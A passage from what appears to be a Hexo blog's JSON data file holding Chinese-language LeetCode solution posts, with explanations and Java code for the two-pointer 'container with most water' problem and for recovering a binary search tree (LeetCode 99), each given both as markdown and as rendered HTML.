2.分析\n利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br>\n\n因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br>\n- 若left 高于 right, 则右边界收缩\n- 若left 低于 right, 则左边界收缩\n- 记录过程中的 Max(area)\n\n### 3.代码实现\n```\nclass Solution {\n    public int maxArea(int[] height) {\n        int right = height.length - 1;\n        int left = 0;\n        int max = 0;\n        while(left < right){\n            int s = Math.min(height[left], height[right]) * (right-left);\n            max = Math.max(max,s);\n            if(height[left] > height[right]){\n                right--;\n            }else{\n                left++;\n            }\n        }\n        return max;\n    }\n}\n```\n","slug":"algorithm/sildewindow/最大面积","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lb003o6dcpj78xpata","content":"<h3 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h3><p><img src=\"https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg\" alt=\"contains\"></p>\n<p>假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br></p>\n<h3 id=\"2-分析\"><a href=\"#2-分析\" class=\"headerlink\" title=\"2.分析\"></a>2.分析</h3><p>利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br></p>\n<p>因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br></p>\n<ul>\n<li>若left 高于 right, 则右边界收缩</li>\n<li>若left 低于 right, 则左边界收缩</li>\n<li>记录过程中的 Max(area)</li>\n</ul>\n<h3 id=\"3-代码实现\"><a href=\"#3-代码实现\" class=\"headerlink\" title=\"3.代码实现\"></a>3.代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public int maxArea(int[] height) &#123;</span><br><span class=\"line\">        int right = height.length - 1;</span><br><span class=\"line\">        int left = 0;</span><br><span class=\"line\">        int max = 0;</span><br><span class=\"line\">        while(left &lt; right)&#123;</span><br><span class=\"line\">            int s = Math.min(height[left], height[right]) * (right-left);</span><br><span class=\"line\">            max = Math.max(max,s);</span><br><span class=\"line\">            if(height[left] &gt; height[right])&#123;</span><br><span class=\"line\">                right--;</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                left++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return max;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h3><p><img src=\"https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg\" alt=\"contains\"></p>\n<p>假设有一个容器，给定一个输入数组height,数组长度不小于2，height[i]代表第i位的木板高度，找到这个数组内的最大面积（容器最大能装水的方案）.<br></p>\n<h3 id=\"2-分析\"><a href=\"#2-分析\" class=\"headerlink\" title=\"2.分析\"></a>2.分析</h3><p>利用滑动窗口，先将整个视为一个窗口，通过不短缩小窗口边界，记录其中的最大值<br></p>\n<p>因为装水的深度取决于两个木板中较矮的那个。所以，窗口边界左移还是右移，看木板的高度。<br></p>\n<ul>\n<li>若left 高于 right, 则右边界收缩</li>\n<li>若left 低于 right, 则左边界收缩</li>\n<li>记录过程中的 Max(area)</li>\n</ul>\n<h3 id=\"3-代码实现\"><a href=\"#3-代码实现\" class=\"headerlink\" title=\"3.代码实现\"></a>3.代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public int maxArea(int[] height) &#123;</span><br><span class=\"line\">        int right = height.length - 1;</span><br><span class=\"line\">        int left = 0;</span><br><span class=\"line\">        int max = 0;</span><br><span class=\"line\">        while(left &lt; right)&#123;</span><br><span class=\"line\">            int s = Math.min(height[left], height[right]) * (right-left);</span><br><span class=\"line\">            max = Math.max(max,s);</span><br><span class=\"line\">            if(height[left] &gt; height[right])&#123;</span><br><span class=\"line\">                right--;</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                left++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return max;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"二叉查找树恢复 leetcode 99","date":"2019-08-14T14:03:30.000Z","_content":"\nhttps://leetcode.com/problems/recover-binary-search-tree/\n\n# 一.原理\n\n二叉查找树的性质决定了，它的中序遍历(左根右) 为递增序列。<br>\n\n所以对二叉树进行中序遍历，判断是否大小有序，找到第一出现前面的值大于后面的值的位置index,和index1大于的最后一个值的index2,交换index1和index2的值.\n\n# 二.实现\n\n## 1.基本实现<br>\nRuntime: 4 ms, faster than 22.08%<br>\nMemory Usage: 39.8 MB, less than 80.77%<br>\n\n```\nclass Solution {\n    public void recoverTree(TreeNode root) {\n        List<TreeNode> list = inOrder(root);\n\n        //标记错误的两个位置\n        int index1 = 0;\n        int index2 = 0;\n        //第一个错误的值\n        Integer value1 = null;\n        //是否发现第一个错误位置\n        boolean lockIndex1 = false;\n\n        for (int i = 0; i<list.size(); i++){\n            //跳过null\n            if(list.get(i) != null){\n                //初始化赋值\n                if(value1 == null ){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n\n                //逐渐向后比较，找到最终index2位置\n                if(value1 > list.get(i).val){\n                    index2 = i;\n                    lockIndex1 = true;\n                }\n\n                //锁定index1位置\n                if(!lockIndex1){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n            }\n\n            //交换值\n            if(i == list.size() -1){\n                list.get(index1).val = list.get(index2).val;\n                list.get(index2).val = value1;\n            }\n        }\n\n        //list.stream().map(e -> e.val).forEach(System.out::println);\n    }\n\n        //中序遍历\n    List<TreeNode> list = new LinkedList<>();\n    public List<TreeNode> inOrder(TreeNode root){\n        if(root != null){\n            //遍历它的左下级节点\n            inOrder(root.left);\n            list.add(root);\n            //左节点完后，遍历右节点\n            inOrder(root.right);\n        }\n        return list;\n    }\n\n}\n```\n\n包括树的构建赋值的全代码\n```\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class TreeTest {\n\n    class TreeNode {\n        Integer val;\n        TreeNode left;\n        TreeNode right;\n\n        TreeNode(Integer x) {\n            this.val = x;\n            this.right = null;\n            this.left = null;\n        }\n    }\n\n    class Tree{\n        TreeNode root = null;\n        List<TreeNode> nodeList = new ArrayList<>();\n\n        Tree(List<Integer> list){\n            for(Integer data: list){\n               nodeList.add(new TreeNode(data));\n            }\n\n            //按层次遍历顺序初始化二叉树\n            for(int row=0; nodeList.size() >= Math.pow(2, row) -1 && nodeList.size() >= Math.pow(2, row) -1 ; row++){\n                for(int col=0; col<Math.pow(2,row); col++){\n                    //当前节点\n                    int index = (int)Math.pow(2, row) + col - 1;\n                    //当前节点的子节点\n                    int index2 = (int)Math.pow(2, row + 1) + 2*col - 1;\n\n                    if(nodeList.size()> index){\n                        //有左右节点\n                        if (nodeList.size()> index2+1 ){\n                            nodeList.get(index).left = nodeList.get(index2);\n                            nodeList.get(index).right = nodeList.get(index2+1);\n                        //只有左节点\n                        }else if(nodeList.size()> index2){\n                            nodeList.get(index).left = nodeList.get(index2);\n                            nodeList.get(index).right = null;\n                        //没有子节点\n                        }else {\n                            nodeList.get(index).left = null;\n                            nodeList.get(index).right = null;\n                        }\n                    }\n                }\n            }\n            //返回根节点\n            root = nodeList.get(0);\n        }\n    }\n\n    //中序遍历\n    List<TreeNode> list = new LinkedList<>();\n    public List<TreeNode> inOrder(TreeNode root){\n        if(root != null){\n            //遍历它的左下级节点\n            inOrder(root.left);\n            list.add(root);\n            //左节点完后，遍历右节点\n            inOrder(root.right);\n        }\n        return list;\n    }\n\n    // 二叉查找树恢复\n    public void recoverTree(TreeNode root) {\n        List<TreeNode> list = inOrder(root);\n\n        //标记错误的两个位置\n        int index1 = 0;\n        int index2 = 0;\n        //第一个错误的值\n        Integer value1 = null;\n        //是否发现第一个错误位置\n        boolean lockIndex1 = false;\n\n        for (int i = 0; i<list.size(); i++){\n            //跳过null\n            if(list.get(i).val != null){\n                //初始化赋值\n                if(value1 == null ){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n\n                //逐渐向后比较，找到最终index2位置\n                if(value1 > list.get(i).val){\n                    index2 = i;\n                    lockIndex1 = true;\n                }\n\n                //锁定index1位置\n                if(!lockIndex1){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n            }\n\n            //交换值\n            if(i == list.size() -1){\n                list.get(index1).val = list.get(index2).val;\n                list.get(index2).val = value1;\n            }\n        }\n\n       //list.stream().map(e -> e.val).forEach(System.out::println);\n    }\n\n\n    public static void main(String[] args){\n        List<Integer> list = Arrays.asList(1,3,null,null,2);\n        Tree tree = new TreeTest().new Tree(list);\n        new TreeTest().recoverTree(tree.root);\n    }\n}\n```\n\n## 2.优化1\n","source":"_posts/algorithm/tree/二叉查找树恢复.md","raw":"---\ntitle: 二叉查找树恢复 leetcode 99\ndate: 2019-08-14 10:03:30\ntags: [algorithm]\n---\n\nhttps://leetcode.com/problems/recover-binary-search-tree/\n\n# 一.原理\n\n二叉查找树的性质决定了，它的中序遍历(左根右) 为递增序列。<br>\n\n所以对二叉树进行中序遍历，判断是否大小有序，找到第一出现前面的值大于后面的值的位置index,和index1大于的最后一个值的index2,交换index1和index2的值.\n\n# 二.实现\n\n## 1.基本实现<br>\nRuntime: 4 ms, faster than 22.08%<br>\nMemory Usage: 39.8 MB, less than 80.77%<br>\n\n```\nclass Solution {\n    public void recoverTree(TreeNode root) {\n        List<TreeNode> list = inOrder(root);\n\n        //标记错误的两个位置\n        int index1 = 0;\n        int index2 = 0;\n        //第一个错误的值\n        Integer value1 = null;\n        //是否发现第一个错误位置\n        boolean lockIndex1 = false;\n\n        for (int i = 0; i<list.size(); i++){\n            //跳过null\n            if(list.get(i) != null){\n                //初始化赋值\n                if(value1 == null ){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n\n                //逐渐向后比较，找到最终index2位置\n                if(value1 > list.get(i).val){\n                    index2 = i;\n                    lockIndex1 = true;\n                }\n\n                //锁定index1位置\n                if(!lockIndex1){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n            }\n\n            //交换值\n            if(i == list.size() -1){\n                list.get(index1).val = list.get(index2).val;\n                list.get(index2).val = value1;\n            }\n        }\n\n        //list.stream().map(e -> e.val).forEach(System.out::println);\n    }\n\n        //中序遍历\n    List<TreeNode> list = new LinkedList<>();\n    public List<TreeNode> inOrder(TreeNode root){\n        if(root != null){\n            //遍历它的左下级节点\n            inOrder(root.left);\n            list.add(root);\n            //左节点完后，遍历右节点\n            inOrder(root.right);\n        }\n        return list;\n    }\n\n}\n```\n\n包括树的构建赋值的全代码\n```\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class TreeTest {\n\n    class TreeNode {\n        Integer val;\n        TreeNode left;\n        TreeNode right;\n\n        TreeNode(Integer x) {\n            this.val = x;\n            this.right = null;\n            this.left = null;\n        }\n    }\n\n    class Tree{\n        TreeNode root = null;\n        List<TreeNode> nodeList = new ArrayList<>();\n\n        Tree(List<Integer> list){\n            for(Integer data: list){\n               nodeList.add(new TreeNode(data));\n            }\n\n            //按层次遍历顺序初始化二叉树\n            for(int row=0; nodeList.size() >= Math.pow(2, row) -1 && nodeList.size() >= Math.pow(2, row) -1 ; row++){\n                for(int col=0; col<Math.pow(2,row); col++){\n                    //当前节点\n                    int index = (int)Math.pow(2, row) + col - 1;\n                    //当前节点的子节点\n                    int index2 = (int)Math.pow(2, row + 1) + 2*col - 1;\n\n                    if(nodeList.size()> index){\n                        //有左右节点\n                        if (nodeList.size()> index2+1 ){\n                            nodeList.get(index).left = nodeList.get(index2);\n                            nodeList.get(index).right = nodeList.get(index2+1);\n                        //只有左节点\n                        }else if(nodeList.size()> index2){\n                            nodeList.get(index).left = nodeList.get(index2);\n                            nodeList.get(index).right = null;\n                        //没有子节点\n                        }else {\n                            nodeList.get(index).left = null;\n                            nodeList.get(index).right = null;\n                        }\n                    }\n                }\n            }\n            //返回根节点\n            root = nodeList.get(0);\n        }\n    }\n\n    //中序遍历\n    List<TreeNode> list = new LinkedList<>();\n    public List<TreeNode> inOrder(TreeNode root){\n        if(root != null){\n            //遍历它的左下级节点\n            inOrder(root.left);\n            list.add(root);\n            //左节点完后，遍历右节点\n            inOrder(root.right);\n        }\n        return list;\n    }\n\n    // 二叉查找树恢复\n    public void recoverTree(TreeNode root) {\n        List<TreeNode> list = inOrder(root);\n\n        //标记错误的两个位置\n        int index1 = 0;\n        int index2 = 0;\n        //第一个错误的值\n        Integer value1 = null;\n        //是否发现第一个错误位置\n        boolean lockIndex1 = false;\n\n        for (int i = 0; i<list.size(); i++){\n            //跳过null\n            if(list.get(i).val != null){\n                //初始化赋值\n                if(value1 == null ){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n\n                //逐渐向后比较，找到最终index2位置\n                if(value1 > list.get(i).val){\n                    index2 = i;\n                    lockIndex1 = true;\n                }\n\n                //锁定index1位置\n                if(!lockIndex1){\n                    value1 = list.get(i).val;\n                    index1 = i;\n                }\n            }\n\n            //交换值\n            if(i == list.size() -1){\n                list.get(index1).val = list.get(index2).val;\n                list.get(index2).val = value1;\n            }\n        }\n\n       //list.stream().map(e -> e.val).forEach(System.out::println);\n    }\n\n\n    public static void main(String[] args){\n        List<Integer> list = Arrays.asList(1,3,null,null,2);\n        Tree tree = new TreeTest().new Tree(list);\n        new TreeTest().recoverTree(tree.root);\n    }\n}\n```\n\n## 2.优化1\n","slug":"algorithm/tree/二叉查找树恢复","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lb003q6dcpjvjd96za","content":"<p><a href=\"https://leetcode.com/problems/recover-binary-search-tree/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/problems/recover-binary-search-tree/</a></p>\n<h1 id=\"一-原理\"><a href=\"#一-原理\" class=\"headerlink\" title=\"一.原理\"></a>一.原理</h1><p>二叉查找树的性质决定了，它的中序遍历(左根右) 为递增序列。<br></p>\n<p>所以对二叉树进行中序遍历，判断是否大小有序，找到第一出现前面的值大于后面的值的位置index,和index1大于的最后一个值的index2,交换index1和index2的值.</p>\n<h1 id=\"二-实现\"><a href=\"#二-实现\" class=\"headerlink\" title=\"二.实现\"></a>二.实现</h1><h2 id=\"1-基本实现\"><a href=\"#1-基本实现\" class=\"headerlink\" title=\"1.基本实现\"></a>1.基本实现<br></h2><p>Runtime: 4 ms, faster than 22.08%<br><br>Memory Usage: 39.8 MB, less than 80.77%<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solution &#123;</span><br><span class=\"line\">    public void recoverTree(TreeNode root) &#123;</span><br><span class=\"line\">        List&lt;TreeNode&gt; list = inOrder(root);</span><br><span class=\"line\"></span><br><span class=\"line\">        //标记错误的两个位置</span><br><span class=\"line\">        int index1 = 0;</span><br><span class=\"line\">        int index2 = 0;</span><br><span class=\"line\">        //第一个错误的值</span><br><span class=\"line\">        Integer value1 = null;</span><br><span class=\"line\">        //是否发现第一个错误位置</span><br><span class=\"line\">        boolean lockIndex1 = false;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (int i = 0; i&lt;list.size(); i++)&#123;</span><br><span class=\"line\">            //跳过null</span><br><span class=\"line\">            if(list.get(i) != null)&#123;</span><br><span class=\"line\">                //初始化赋值</span><br><span class=\"line\">                if(value1 == null )&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //逐渐向后比较，找到最终index2位置</span><br><span class=\"line\">                if(value1 &gt; list.get(i).val)&#123;</span><br><span class=\"line\">                    index2 = i;</span><br><span class=\"line\">                    lockIndex1 = true;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //锁定index1位置</span><br><span class=\"line\">                if(!lockIndex1)&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //交换值</span><br><span class=\"line\">            if(i == list.size() -1)&#123;</span><br><span class=\"line\">                list.get(index1).val = list.get(index2).val;</span><br><span class=\"line\">                list.get(index2).val = value1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //list.stream().map(e -&gt; e.val).forEach(System.out::println);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //中序遍历</span><br><span class=\"line\">    List&lt;TreeNode&gt; list = new LinkedList&lt;&gt;();</span><br><span class=\"line\">    public List&lt;TreeNode&gt; inOrder(TreeNode root)&#123;</span><br><span class=\"line\">        if(root != null)&#123;</span><br><span class=\"line\">            //遍历它的左下级节点</span><br><span class=\"line\">            inOrder(root.left);</span><br><span class=\"line\">            list.add(root);</span><br><span class=\"line\">            //左节点完后，遍历右节点</span><br><span class=\"line\">            inOrder(root.right);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>包括树的构建赋值的全代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import java.util.LinkedList;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class TreeTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    class TreeNode &#123;</span><br><span class=\"line\">        Integer val;</span><br><span class=\"line\">        TreeNode left;</span><br><span class=\"line\">        TreeNode right;</span><br><span class=\"line\"></span><br><span class=\"line\">        TreeNode(Integer x) &#123;</span><br><span class=\"line\">            this.val = x;</span><br><span class=\"line\">            this.right = null;</span><br><span class=\"line\">            this.left = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Tree&#123;</span><br><span class=\"line\">        TreeNode root = null;</span><br><span class=\"line\">        List&lt;TreeNode&gt; nodeList = new ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        Tree(List&lt;Integer&gt; list)&#123;</span><br><span class=\"line\">            for(Integer data: list)&#123;</span><br><span class=\"line\">               nodeList.add(new TreeNode(data));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //按层次遍历顺序初始化二叉树</span><br><span class=\"line\">            for(int row=0; nodeList.size() &gt;= Math.pow(2, row) -1 &amp;&amp; nodeList.size() &gt;= Math.pow(2, row) -1 ; row++)&#123;</span><br><span class=\"line\">                for(int col=0; col&lt;Math.pow(2,row); col++)&#123;</span><br><span class=\"line\">                    //当前节点</span><br><span class=\"line\">                    int index = (int)Math.pow(2, row) + col - 1;</span><br><span class=\"line\">                    //当前节点的子节点</span><br><span class=\"line\">                    int index2 = (int)Math.pow(2, row + 1) + 2*col - 1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    if(nodeList.size()&gt; index)&#123;</span><br><span class=\"line\">                        //有左右节点</span><br><span class=\"line\">                        if (nodeList.size()&gt; index2+1 )&#123;</span><br><span class=\"line\">                            nodeList.get(index).left = nodeList.get(index2);</span><br><span class=\"line\">                            nodeList.get(index).right = nodeList.get(index2+1);</span><br><span class=\"line\">                        //只有左节点</span><br><span class=\"line\">                        &#125;else if(nodeList.size()&gt; index2)&#123;</span><br><span class=\"line\">                            nodeList.get(index).left = nodeList.get(index2);</span><br><span class=\"line\">                            nodeList.get(index).right = null;</span><br><span class=\"line\">                        //没有子节点</span><br><span class=\"line\">                        &#125;else &#123;</span><br><span class=\"line\">                            nodeList.get(index).left = null;</span><br><span class=\"line\">                            nodeList.get(index).right = null;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            //返回根节点</span><br><span class=\"line\">            root = nodeList.get(0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //中序遍历</span><br><span class=\"line\">    List&lt;TreeNode&gt; list = new LinkedList&lt;&gt;();</span><br><span class=\"line\">    public List&lt;TreeNode&gt; inOrder(TreeNode root)&#123;</span><br><span class=\"line\">        if(root != null)&#123;</span><br><span class=\"line\">            //遍历它的左下级节点</span><br><span class=\"line\">            inOrder(root.left);</span><br><span class=\"line\">            list.add(root);</span><br><span class=\"line\">            //左节点完后，遍历右节点</span><br><span class=\"line\">            inOrder(root.right);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 二叉查找树恢复</span><br><span class=\"line\">    public void recoverTree(TreeNode root) &#123;</span><br><span class=\"line\">        List&lt;TreeNode&gt; list = inOrder(root);</span><br><span class=\"line\"></span><br><span class=\"line\">        //标记错误的两个位置</span><br><span class=\"line\">        int index1 = 0;</span><br><span class=\"line\">        int index2 = 0;</span><br><span class=\"line\">        //第一个错误的值</span><br><span class=\"line\">        Integer value1 = null;</span><br><span class=\"line\">        //是否发现第一个错误位置</span><br><span class=\"line\">        boolean lockIndex1 = false;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (int i = 0; i&lt;list.size(); i++)&#123;</span><br><span class=\"line\">            //跳过null</span><br><span class=\"line\">            if(list.get(i).val != null)&#123;</span><br><span class=\"line\">                //初始化赋值</span><br><span class=\"line\">                if(value1 == null )&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //逐渐向后比较，找到最终index2位置</span><br><span class=\"line\">                if(value1 &gt; list.get(i).val)&#123;</span><br><span class=\"line\">                    index2 = i;</span><br><span class=\"line\">                    lockIndex1 = true;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                //锁定index1位置</span><br><span class=\"line\">                if(!lockIndex1)&#123;</span><br><span class=\"line\">                    value1 = list.get(i).val;</span><br><span class=\"line\">                    index1 = i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //交换值</span><br><span class=\"line\">            if(i == list.size() -1)&#123;</span><br><span class=\"line\">                list.get(index1).val = list.get(index2).val;</span><br><span class=\"line\">                list.get(index2).val = value1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       //list.stream().map(e -&gt; e.val).forEach(System.out::println);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        